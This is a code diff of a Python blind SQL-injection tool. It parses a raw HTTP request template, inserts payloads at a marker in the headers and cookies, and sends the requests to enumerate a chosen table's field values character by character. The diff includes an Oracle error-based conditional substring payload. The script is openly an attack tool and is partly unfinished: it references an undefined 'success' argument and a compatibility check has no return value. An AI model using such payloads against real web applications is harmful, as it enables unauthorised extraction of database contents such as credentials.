@@ -1,7 +1,12 @@
+import email
 from io import BytesIO
 from http.server import BaseHTTPRequestHandler
 import argparse
+import io
+from pprint import pprint
 import sys
+from urllib import response
+import requests
 
 from distutils.log import error
 from ast import arg
@@ -17,16 +22,19 @@ parser.add_argument(
     "--template", help="The request template used to contain the injection code.", type=str, default='template.txt')
 parser.add_argument(
     "--wordlist", help="The wordlist used for payloads", type=str, default="wordlists/atob0to9.txt")
+parser.add_argument(
+    "--ssl", help="The wordlist used for payloads", action=argparse.BooleanOptionalAction)
 # parser.add_argument(
 #     "--url", help="The target URL.", type=str)
+
 parser.add_argument(
-    "table_name", help="The table containing the information to enumerate.", type=str)
+    "table", help="The table containing the information to enumerate.", type=str)
 parser.add_argument(
-    "column_name", help="The column name used to match a record to enumerate.", type=str)
+    "columnName", help="The column name used to match a record to enumerate.", type=str)
 parser.add_argument(
-    "column_value", help="The column value used to match a record to enumerate.", type=str)
+    "columnValue", help="The column value used to match a record to enumerate.", type=str)
 parser.add_argument(
-    "field_name", help="The field to enumerate.", type=str)
+    "fieldName", help="The field to enumerate.", type=str)
 
 # Settings
 MARKER = '[[INJECTION_POINT]]'
@@ -42,24 +50,12 @@ ORACLE = {
     'CONDITIONAL_SUBSTRING_ENUM': "||(SELECT CASE WHEN SUBSTR($field_name,$index,1)='$value' THEN to_char(1/0) ELSE '' END FROM $table WHERE username='$identifier')||"
 }
 
-
-class HTTPRequest(BaseHTTPRequestHandler):
-    def __init__(self, request_text):
-        self.rfile = BytesIO(request_text)
-        self.raw_requestline = self.rfile.readline()
-        self.error_code = self.error_message = None
-        self.parse_request()
-
-    def send_error(self, code, message):
-        self.error_code = code
-        self.error_message = message
-
-
 args = parser.parse_args()
+
 tableName = args.table
 columnName = args.columnName
 columnValue = args.columnValue
-target = args.field
+target = args.fieldName
 
 try:
     wlFile = open(args.wordlist, "r")
@@ -78,11 +74,16 @@ else:
     template = templateFile.read()
     templateFile.close()
 
-request = HTTPRequest(template)
+request_line, headers_alone = template.split('\n', 1)
+
+message = email.message_from_file(io.StringIO(headers_alone))
+headers = dict(message.items())
+protocol = "https://" if args.ssl else "http://"
+url = f"{protocol}{headers['Host']}{request_line.replace('GET ', '').replace(' HTTP/1.1', '')}"
 
 
 def isSqlCompatible():
-    result = executeRequest(inject(SQL["BASIC_CMD"]))
+    result = executeRequest()
     print("Checking SQL is being used")
 
 
@@ -104,14 +105,26 @@ def generateSqlStatement(sql):
     print("Generating SQL statement")
 
 
-def inject(sql, template):
+def inject(sql):
     print("Injecting SQL into template")
-    return template.replace(MARKER, sql)
+    for header, value in headers.items():
+        if MARKER in value:
+            headers[header] = value.replace(MARKER, f"' {sql}'")
+
+    pprint(headers)
 
 
-def executeRequest(payload):
+def executeRequest():
     print("Sending payload")
-    #request = requests.get(args.url, headers={})
+    cookies = dict()
+    orgCookies = headers['Cookie'].split(';')
+    for cookie in orgCookies:
+        fK = cookie.split("=")
+        cookies.update({fK[0]: fK[1]})
+    response = requests.get(url, cookies=cookies)
+    print(headers['Cookie'])
+    containsMarker = args.success in response.text
+    print(f'Request body returned - {response.headers}\n\n{response.text}')
 
 
 if not isSqlCompatible():
